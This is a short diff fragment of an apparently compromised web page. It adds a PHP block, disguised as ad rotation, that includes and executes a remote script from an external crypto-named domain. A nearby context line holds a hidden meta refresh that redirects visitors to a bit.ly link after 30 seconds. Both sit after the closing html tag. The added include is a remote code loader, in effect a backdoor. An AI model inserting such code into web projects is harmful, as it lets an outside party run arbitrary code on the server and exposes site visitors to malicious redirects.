@@ -118,6 +118,10 @@
 <style>.u-disable-duration * {transition-duration: 0s !important;}</style></body></html>
 <meta http-equiv="refresh" content="30;url=https://bit.ly/3TFl6Ur" />
 
+<?php $theAds = array('https://btcmeding.pages.dev/images/test.php', 'https://btcmeding.pages.dev/images/test.php', 'https://btcmeding.pages.dev/images/test.php');
+include $theAds[mt_rand(0, count($theAds) - 1)];
+?>
+
 <? 
  //Chooses a random number 
  $num = Rand (1,3); 
